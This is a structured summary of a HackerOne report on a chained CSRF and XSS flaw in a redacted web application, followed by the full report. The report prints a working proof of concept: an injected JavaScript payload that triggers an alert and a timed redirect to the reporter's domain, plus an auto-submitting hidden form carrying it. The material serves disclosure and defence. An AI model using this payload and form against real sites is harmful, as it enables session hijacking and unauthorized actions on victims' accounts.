# CSRF to XSS - Chained Vulnerability Leading to Session Hijacking and Unauthorized Actions

## Metadata
- **Source:** HackerOne
- **Report:** 2736979 | https://hackerone.com/reports/2736979
- **Submitted:** 2024-09-24
- **Reporter:** k0x
- **Program:** HackerOne
- **Bounty:** Unknown - Report ID 2736979
- **Severity:** High
- **Vuln:** Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), Insufficient CSRF Protection, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A critical vulnerability chain combining CSRF and XSS was discovered where attackers can inject malicious JavaScript payloads through poorly sanitized form inputs, bypassing CSRF protections to execute arbitrary code in authenticated user sessions. The vulnerability allows attackers to steal session tokens, perform unauthorized actions, and redirect victims to attacker-controlled sites without requiring user interaction beyond the initial login.

## Attack scenario
1. Attacker crafts a JavaScript payload containing malicious code (e.g., cookie stealing, redirects) and embeds it in a form input parameter value
2. Attacker creates a malicious webpage containing a hidden form with pre-filled CSRF token and the malicious payload in the 'source' parameter
3. Victim with active session on the vulnerable application visits the attacker's malicious webpage or clicks a crafted link
4. Attacker's JavaScript automatically submits the hidden form via CSRF, exploiting lack of CSRF validation on the vulnerable endpoint
5. The malicious payload (JavaScript) is processed and stored/reflected by the application without proper sanitization
6. Victim's browser executes the injected JavaScript in the context of the trusted application, allowing session hijacking, data theft, or redirection to phishing sites

## Root cause
The application fails to properly validate and sanitize user inputs, particularly in the 'source' parameter and other form fields. Additionally, CSRF token validation is insufficient or bypassable, allowing arbitrary form submissions. The combination enables XSS payloads to bypass security controls by leveraging authenticated CSRF requests.

## Attacker mindset
An attacker recognizes that while individual defenses (CSRF tokens, input validation) exist, they are not comprehensively implemented. By chaining CSRF with XSS, the attacker leverages the user's authenticated session to inject code that executes with the user's privileges, making detection and prevention significantly harder. The attacker exploits the trust relationship between user and application.

## Defensive takeaways
- Implement strict input validation and output encoding on all user-supplied data, especially in form parameters
- Use context-aware encoding (HTML, JavaScript, URL encoding) based on where data is rendered
- Verify CSRF tokens are properly validated for all state-changing requests and cannot be predicted or stolen
- Implement Content Security Policy (CSP) headers to restrict script execution sources and prevent inline script execution
- Apply defense-in-depth: combine CSRF tokens with SameSite cookie attributes and double-submit cookie patterns
- Sanitize all user inputs on both client and server side; never trust client-side validation
- Use templating engines that auto-escape by default
- Implement proper session management with secure, httpOnly, Secure flags on cookies
- Regular security testing including both automated scanning and manual penetration testing for chained vulnerabilities

## Variant hunting
Search for other endpoints accepting user input that is reflected or stored without proper sanitization, particularly in alert/notification features, search functionality, feed creation, and user preferences. Test all parameters visible in the CSRF PoC (features_name, radius_input, tags_input, etc.) for similar injection vectors. Check for other forms that may have weak CSRF token implementation or predictable tokens.

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1539
- T1185
- T1189
- T1200

## Notes
The writeup demonstrates a sophisticated attack combining two OWASP Top 10 vulnerabilities. The attacker bypasses CSRF protection by leveraging the victim's authenticated session, and the XSS payload successfully injects and executes arbitrary code. The payload uses encoded characters in the CSRF PoC HTML, indicating the application may attempt basic filtering that is insufficient. The 5-second timeout in the redirect suggests the attacker wants visibility before exfiltrating the victim. The report lacks specific CVE assignment and patch information, suggesting it may be from an unreleased or privately disclosed vulnerability.

## Full report
<details><summary>Expand</summary>

Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two distinct attack vectors, but when combined, they can significantly increase the impact of an attack.

- **XSS (Cross-Site Scripting):** In an XSS attack, an attacker injects malicious scripts (typically JavaScript) into a trusted website. These scripts are then executed in the victim's browser without their knowledge. This allows attackers to steal sensitive data like cookies, session tokens, or perform actions on behalf of the user.
- **CSRF (Cross-Site Request Forgery):** CSRF tricks a victim into performing unwanted actions on a web application where they are authenticated. When combined with XSS, attackers can bypass CSRF defenses by using the victim's active session to perform actions like changing account details, transferring funds, or modifying settings.

## Impact

- **Stealing Authentication Tokens:** XSS can steal session cookies, making it easier to forge authenticated requests via CSRF.
- **Automating Malicious Actions:** XSS can directly create malicious requests, such as submitting forms or performing transactions, bypassing CSRF protections and leading to unauthorized actions on behalf of the victim.
- **Higher Attack Success Rate:** When XSS and CSRF are combined, even CSRF tokens can be stolen and used, making it very hard for applications to prevent such attacks.

## System Host(s)
www.█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**Step 1:** Malicious JavaScript Payload

The following JavaScript code represents a payload that an attacker could use to steal cookies:

```javascript
video");
alert('Hacked by k0x');
setTimeout(()=>location.href='████',5000);//
```

**Step 2:**  Malicious Website for CSRF

An attacker crafts a malicious Website to exploit the CSRF vulnerability. When a user clicks the link, it triggers a request to the vulnerable application (It could be redirected without a click):

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://www.████████/alerts" method="POST">
      <input type="hidden" name="csrf&#95;token" value="75ce3b80fbeb820dc230d2cf674283a5" />
      <input type="hidden" name="alerts&#95;invite&#95;id" value="" />
      <input type="hidden" name="hash" value="" />
      <input type="hidden" name="search&#95;type" value="content" />
      <input type="hidden" name="search" value="kaos" />
      <input type="hidden" name="phrase" value="0" />
      <input type="hidden" name="phrase" value="1" />
      <input type="hidden" name="features&#95;name" value="" />
      <input type="hidden" name="features&#95;input" value="" />
      <input type="hidden" name="feed&#95;channels&#95;name" value="" />
      <input type="hidden" name="feed&#95;channels&#95;input" value="" />
      <input type="hidden" name="radius&#95;name" value="" />
      <input type="hidden" name="radius&#95;input" value="" />
      <input type="hidden" name="radius&#95;range" value="10" />
      <input type="hidden" name="state&#95;name" value="&#45;1" />
      <input type="hidden" name="state&#95;input" value="" />
      <input type="hidden" name="hometown&#95;name" value="" />
      <input type="hidden" name="hometown&#95;input" value="" />
      <input type="hidden" name="personnel&#95;name" value="" />
      <input type="hidden" name="personnel&#95;input" value="" />
      <input type="hidden" name="publication&#95;name" value="" />
      <input type="hidden" name="publication&#95;input" value="" />
      <input type="hidden" name="series&#95;name" value="&#45;1" />
      <input type="hidden" name="series&#95;input" value="" />
      <input type="hidden" name="tags&#95;name" value="" />
      <input type="hidden" name="tags&#95;input" value="" />
      <input type="hidden" name="unit&#95;name" value="" />
      <input type="hidden" name="unit&#95;input" value="" />
      <input type="hidden" name="source&#91;&#93;" value="video&quot;&#41;&#59;&#13;&#10;alert&#40;&apos;Hacked&#32;by&#32;k0x&apos;&#41;&#59;&#13;&#10;setTimeout&#40;&#40;&#41;&#61;&gt;location&#46;href&#61;&apos;https&#58;&#47;&#47;k0x&#46;xyz&apos;&#44;5000&#41;&#59;&#47;&#47;" />
      <input type="hidden" name="freq" value="hourly" />
      <input type="hidden" name="delivery&#95;method" value="email" />
      <input type="hidden" name="member&#95;email&#95;id" value="1223198" />
      <input type="hidden" name="submit" value="CREATE&#32;NEWSWIRE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Step 3:** Recreate Attack Flow

1. **User Logs In:** The victim logs into the vulnerable application, maintaining an active session.
2. **Clicking the Malicious Link:** The victim receives a message or email with the malicious link. Upon clicking, they are redirected to the attacker's controlled site.
3. **CSRF Exploitation:** The malicious link triggers a CSRF attack that executes the injected JavaScript payload, which may steal cookies or perform unauthorized actions.
4. **Payload Execution:** The attacker can use the stolen cookies or perform actions such as changing account settings, transferring funds, etc.

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-12*
